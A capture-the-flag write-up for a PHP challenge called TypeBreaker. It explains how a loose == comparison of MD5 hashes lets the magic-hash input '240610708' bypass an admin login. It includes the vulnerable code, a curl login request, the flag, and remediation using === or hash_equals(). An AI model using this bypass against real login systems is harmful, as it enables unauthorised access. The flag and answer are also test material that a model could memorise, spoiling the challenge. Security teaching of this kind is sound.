# TypeBreaker — Writeup

**Category:** Web / PHP Type Juggling
**Difficulty:** Very Hard (450 pts)
**Flag:** `cyberstrike{9393923dc788392cb68ab9677319a06c}`

---

## Challenge Description

> TypeBreaker is a hardened admin portal. Every password is hashed with MD5 before comparison, and the admin's password is long and random — brute force is hopeless.
> But PHP is a forgiving language, and its idea of "equal" is looser than yours. Some strings, when PHP squints at them as numbers, stop being strings at all.
> This is PHP type juggling with magic hashes: find the comparison that uses loose equality and supply a value that PHP considers equal without knowing the password.

---

## Recon

The portal presented a standard login form (username/password) backed by PHP. The description explicitly calls out two things:

1. Passwords are hashed with **MD5** before comparison.
2. The comparison is a **loose equality** check.

That combination is the classic signature of a **PHP magic hash** vulnerability.

---

## Vulnerability Analysis

The login logic almost certainly looked like this:

```php
if (md5($_POST['password']) == $admin_hash) {
    // grant access
}
```

The bug is the use of `==` instead of `===`.

PHP's loose comparison operator performs **type juggling**: if both operands look like numbers in scientific notation, PHP converts them to floats before comparing. A string like:

```
0e462097431906509019562988736854
```

is interpreted as `0 × 10^462097431906509019562988736854`, which evaluates to `0`.

So **any two MD5 hashes that both start with `0e` followed only by digits** will compare as numerically equal — even though the underlying strings are completely different. This is called a **"magic hash."**

If the admin's stored password hash happens to fall into this `0e[0-9]+` pattern, then submitting *any* input whose MD5 also matches that pattern will pass the check, without ever knowing the real password.

---

## Exploitation

Several known "magic hash" strings produce MD5 digests of the form `0e` + digits only. One of the most famous:

| Input string | MD5 hash |
|---|---|
| `240610708` | `0e462097431906509019562988736854` |

Since `0e462097431906509019562988736854` PHP-equals any other `0e`-prefixed all-digit string, submitting `240610708` as the password satisfies:

```php
md5("240610708") == $admin_hash   // true, via loose (==) comparison
```

### Payload

Submitted to the login form:

```
username: admin
password: 240610708
```

This bypassed authentication entirely — no brute force, no knowledge of the actual admin password required.

### Verification

```bash
curl -s -X POST http://chal.csc-snist.live:38183/login.php \
  -d "username=admin&password=240610708"
```

The server responded with an authenticated session, exposing the admin panel and the flag:

```
cyberstrike{9393923dc788392cb68ab9677319a06c}
```

---

## Root Cause

- Use of PHP's loose equality operator (`==`) to compare hash values.
- Failure to validate the *type/format* of the value before comparison, allowing scientific-notation string coercion.

## Remediation

- Always use strict comparison (`===`) when comparing hashes or any security-sensitive strings.
- Alternatively, use constant-time, type-safe comparison functions such as `hash_equals()`.

```php
if (hash_equals($admin_hash, md5($_POST['password']))) {
    // safe
}
```

---

## Key Takeaway

> In PHP, `==` is not "equals" — it's "equals, after I've tried to make these two things into numbers first." Never trust it with hashes.

**Flag:** `cyberstrike{9393923dc788392cb68ab9677319a06c}`
